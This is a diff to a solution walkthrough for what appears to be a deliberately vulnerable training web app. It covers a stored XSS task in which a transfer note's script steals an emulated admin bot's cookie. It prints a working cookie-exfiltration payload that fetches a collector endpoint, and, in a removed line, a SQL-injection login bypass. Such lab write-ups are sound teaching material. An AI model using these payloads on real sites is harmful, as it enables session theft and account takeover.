@@ -77,16 +77,26 @@ The VIP card's number is the flag (Peter Kovac's row). Enumerate other tables th
 same way (see Recon).
 
 ### W1-03 — stored XSS → admin cookie theft (A03) · surface: `/transfer` *Note*
-- **Find it:** send a transfer with a note like `<b>hi</b>`, then **Report to admin
-  for review**. Log in as admin (`admin'-- `) and open `/admin/review`: your HTML
-  renders (the note is output unescaped) → stored XSS in the admin view.
-- **Exploit:** put a cookie-stealing payload in the note, pick your own token:
+- **Threat model:** you are a **normal user** — you do **not** have admin access
+  and you don't need it. Transfers can be flagged **Report to admin for review**;
+  the admin's review screen renders the note **without escaping**, so JavaScript
+  you store in a note runs in the *admin's* browser and reads the admin's cookie
+  (which carries `FLAG_W1-03`). You make the admin's browser leak its own cookie
+  to you — that is the whole point of the task.
+- **Find it:** store a small test payload that calls back to a collector you
+  control, submit the transfer, click **Report to admin**, then check your
+  collector — if a hit arrives, the note was not escaped (stored XSS confirmed).
+- **Exploit:** pick your own token and store this as the note:
 ```html
 <script>fetch('/w1-03/collect/MYTOKEN?c='+document.cookie)</script>
 ```
-Report it → the emulated admin "runs" it → read your loot at `/w1-03/collect/MYTOKEN`.
-The stolen admin cookie carries `FLAG_W1-03`. ("Report to admin" is the XSS-bot
-trigger — without it the admin never sees your note.)
+Submit → **Report to admin** → read your loot at `/w1-03/collect/MYTOKEN` (or use
+`/collector`). The captured admin cookie contains `FLAG_W1-03`.
+> **Report to admin** triggers an *emulated admin bot* that "views" your note and
+> runs the script — the bot is the victim, so **no admin login is involved**. A
+> human `/admin/review` page exists for realism but the exploit never needs it.
+> (You could separately become admin via W1-01's SQLi, but that's a different
+> task; W1-03 is meant to be solved with no admin access at all.)
 
 ### W1-04 — reflected XSS (A05) · surface: `/search`
 - **Find it:** search `<b>hi</b>` → it renders bold in "Results for:" → the value is
